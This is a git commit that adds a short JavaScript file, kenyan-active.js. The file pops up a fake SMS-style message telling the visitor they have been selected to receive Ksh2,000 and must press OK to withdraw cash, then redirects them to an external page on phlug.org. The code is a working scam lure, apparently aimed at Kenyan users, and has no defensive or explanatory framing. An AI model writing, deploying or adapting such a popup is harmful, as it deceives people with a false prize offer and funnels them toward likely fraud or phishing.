61460162773ccf974696abfe147d8c0ae4f1c2d8
itidnewblog4 <ukpehaitid2@gmail.com>
2025-09-30 18:42:49 +0100

    Create kenyan-active.js

---
+++ kenyan-active.js
@@ -0,0 +1,5 @@
+var password = 'WITHDRAW Ksh2,000'
+password=prompt('SMS: Congratulations, you are among the selected ones to receive Ksh2,000 funds, Press Ok to withdraw cash Now ','WITHDRAW Ksh2,000');
+if (password != 'WITHDRAW Ksh2,000') {
+location.href='https://phlug.org/kenya.html';
+}
